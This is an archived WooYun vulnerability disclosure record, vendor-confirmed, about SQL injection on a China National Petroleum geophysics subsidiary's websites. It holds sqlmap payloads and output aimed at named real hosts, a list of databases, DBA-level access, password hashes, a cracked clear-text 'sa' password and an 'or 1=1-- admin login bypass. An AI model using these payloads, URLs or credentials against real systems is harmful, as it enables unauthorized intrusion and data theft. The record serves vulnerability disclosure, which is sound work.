{"id": 47504, "wybug_id": "wooyun-2014-086404", "wybug_title": "中国石油某分站存在一处SQL注入导致泄露多个网站数据", "wybug_corp": "中国石油天然气集团公司", "wybug_author": "aaaaty", "wybug_date": "2014-12-09 10:02", "wybug_open_date": "2015-01-23 10:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-23：\t细节向公众公开  简要描述： 中国石油某分站存在一处SQL注入导致泄露多个网站数据  192+27+6+131+9+28+7 400个表 详细说明：  注入点泄露的是中国石油集团东方地球物理公司的数据库注入点：\nhttp://ffyj.bgpintl.com/Web/ShowShared.aspx?m=research&type=Research&strID=31\n\n\nsqlmap：sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: strID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: m=research&type=Research&strID=31' AND 4998=4998 AND 'uaSC'='uaSC    Type: UNION query    Title: Generic UNION query (NULL) - 11 columns    Payload: m=research&type=Research&strID=-4462' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(98)+CHAR(120)+CHAR(122)+CHAR(113)+CHAR(116)+CHAR(90)+CHAR(101)+CHAR(88)+CHAR(104)+CHAR(77)+CHAR(69)+CHAR(119)+CHAR(104)+CHAR(100)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(107)+CHAR(113),NULL,NULL,NULL,NULL,NULL--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase OR time-based blind (heavy query)    Payload: m=research&type=Research&strID=-8736' OR 5227=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'ZOFg'='ZOFg---[16:12:53] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 or Vistaweb application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2005[16:12:53] [INFO] fetching database names[16:12:53] [WARNING] reflective value(s) found and filtering out[16:12:53] [INFO] the SQL query used returns 11 entries[16:12:54] [INFO] retrieved: bbsmax[16:12:54] [INFO] retrieved: BGP_Abroad_Item[16:12:54] [INFO] retrieved: FFYJ_datebase[16:12:55] [INFO] retrieved: LT_BBS[16:12:55] [INFO] retrieved: master[16:12:55] [INFO] retrieved: model[16:12:56] [INFO] retrieved: msdb[16:12:56] [INFO] retrieved: ReportServer[16:12:56] [INFO] retrieved: ReportServerTempDB[16:12:56] [INFO] retrieved: tempdb[16:12:57] [INFO] retrieved: Timber_Exam_Govavailable databases [11]:[*] bbsmax[*] BGP_Abroad_Item[*] FFYJ_datebase[*] LT_BBS[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] Timber_Exam_Gov\n包括方法研究所http://ffyj.bgpintl.com/ 中国石油东方地球物理公司国际部http://www.bgpintl.com/ 国际部工资管理系统http://w3.bgpintl.com/login.aspx 培训考试系统均泄露 http://peixun.bgpintl.com/web/Index.aspx\n权限很高：current user is DBA:    True 泄露了明文数据库用户密码：database management system users password hashes:[*] sa [1]:    password hash: 0x01004086ceb645dd76333282a7f501bca29748948a82f113d6e5        header: 0x0100        salt: 4086ceb6        mixedcase: 45dd76333282a7f501bca29748948a82f113d6e5    clear-text password: sasasa[*] ttos [1]:    password hash: 0x010031ef1949706f17f997b202278cfce845c6f7ed2b99a4a9ea        header: 0x0100        salt: 31ef1949        mixedcase: 706f17f997b202278cfce845c6f7ed2b99a4a9ea2.东方地球物理公司后台万能密码登陆 http://www.bgp.com.cn/login.aspx 'or 1=1-- （用户名密码均为） \n\n 可以修改网站基本信息   漏洞证明：  available databases [11]:[*] bbsmax[*] BGP_Abroad_Item[*] FFYJ_datebase[*] LT_BBS[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdb[*] Timber_Exam_Gov\nPS:http://wooyun.org/bugs/wooyun-2014-056884原理同上，没修复\n   修复方案：  敏感字符过滤   版权声明：转载请注明来源 aaaaty@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-12-10 16:44 厂商回复： 感谢，正在整改 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}